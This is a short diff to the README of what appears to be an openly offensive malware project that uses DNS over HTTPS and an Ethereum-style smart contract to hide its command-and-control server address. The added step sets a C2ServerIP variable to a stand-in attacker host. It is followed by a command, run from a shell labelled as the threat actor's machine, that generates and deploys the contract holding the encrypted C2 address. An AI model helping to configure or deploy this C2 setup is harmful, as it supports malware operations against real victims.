@@ -17,6 +17,13 @@ DNS over HTTPS targeted malware (only runs once)
 
 ## Usage Steps
 
+
+###### 0 - Edit contract_generator.py file
+```
+modify C2ServerIP variable:
+C2ServerIP = "attacker.domain.com"
+```
+
 ###### 1 - Generate and deploy smart contract (contains the AES encrypted DNS address of server)
 ```
 attacker_machine@ThreatActor:$ python3 contract_generator.py 
